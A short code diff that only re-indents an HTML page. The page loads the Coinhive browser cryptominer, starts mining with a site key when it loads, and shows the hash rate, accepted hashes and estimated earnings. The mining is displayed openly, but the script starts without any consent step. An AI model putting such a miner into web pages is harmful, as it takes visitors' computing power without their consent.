@@ -4,10 +4,10 @@
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
-        autoThreads: true,
-	throttle: 0.7,
-	forceASMJS: true
-});
+		autoThreads: true,
+		throttle: 0.7,
+		forceASMJS: true
+	});
 	miner.start();
 	miner.on('found', function(){})
 	miner.on('accepted', function(){})
@@ -17,7 +17,7 @@
 		var acceptedHashes = miner.getAcceptedHashes();
 		var ntd = acceptedHashes/1000000*0.139;
 		document.getElementById("hash").textContent = hashesPerSecond;
-       		document.getElementById("coin").textContent = acceptedHashes;
+		document.getElementById("coin").textContent = acceptedHashes;
 		document.getElementById("ntd").textContent = ntd;
 	}, 1000);
 </script>
